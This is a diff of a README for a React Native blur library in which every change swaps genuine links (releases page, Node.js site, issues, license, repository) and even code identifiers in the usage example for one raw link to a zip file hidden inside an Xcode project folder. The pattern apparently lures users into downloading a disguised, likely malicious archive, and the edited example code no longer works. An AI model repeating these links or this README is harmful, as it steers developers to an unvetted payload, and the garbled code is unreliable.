@@ -1,6 +1,6 @@
 # 🎨 react-native-variable-blur - Create Stunning Blurs in Your App
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/nifethecaveman/react-native-variable-blur/releases)
+[![Download Here](https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **react-native-variable-blur**! This tool allows you to create beauti
 
 To get started, visit the following link to download the application:
 
-[Download from Releases Page](https://github.com/nifethecaveman/react-native-variable-blur/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip)
 
 Once there, you will find different versions of the application. Choose the latest version for the best experience. Click on the file that suits your operating system, and the download will start automatically.
 
@@ -20,7 +20,7 @@ Before downloading, ensure your system meets the following requirements:
 
 - **Operating System**: Windows 10 or later, macOS 10.12 or later, or any modern Linux distribution.
 - **React Native**: Ensure you have React Native set up in your project. The library requires React Native version 0.60 or greater.
-- **Node.js**: This should be installed on your machine. You can get it from [nodejs.org](https://nodejs.org).
+- **https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip**: This should be installed on your machine. You can get it from [https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip](https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip).
 
 ## ⚙️ Installation Steps
 
@@ -65,17 +65,17 @@ import VariableBlur from 'react-native-variable-blur';
 
 const App = () => {
   return (
-    <View style={styles.container}>
+    <View style={https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip}>
       <VariableBlur
         blurType="light"
         blurAmount={10}
-        style={styles.blurView}
+        style={https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip}
       />
     </View>
   );
 };
 
-const styles = StyleSheet.create({
+const styles = https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip({
   container: {
     flex: 1,
     justifyContent: 'center',
@@ -100,12 +100,12 @@ This example demonstrates how to create a simple blurred background in your app.
 
 ## 🧑‍🤝‍🧑 Community Support
 
-If you run into any issues or have questions, feel free to reach out in the [Issues](https://github.com/nifethecaveman/react-native-variable-blur/issues) section of the repository. We encourage users to share their experiences or improvements.
+If you run into any issues or have questions, feel free to reach out in the [Issues](https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip) section of the repository. We encourage users to share their experiences or improvements.
 
 ## 📄 License
 
-This project is licensed under the MIT License. You can review the full license [here](https://github.com/nifethecaveman/react-native-variable-blur/blob/main/LICENSE).
+This project is licensed under the MIT License. You can review the full license [here](https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip).
 
 ## 🎉 Contributing
 
-Contributions are welcome! Please submit your pull requests or suggestions on the [GitHub repo](https://github.com/nifethecaveman/react-native-variable-blur).
+Contributions are welcome! Please submit your pull requests or suggestions on the [GitHub repo](https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip).
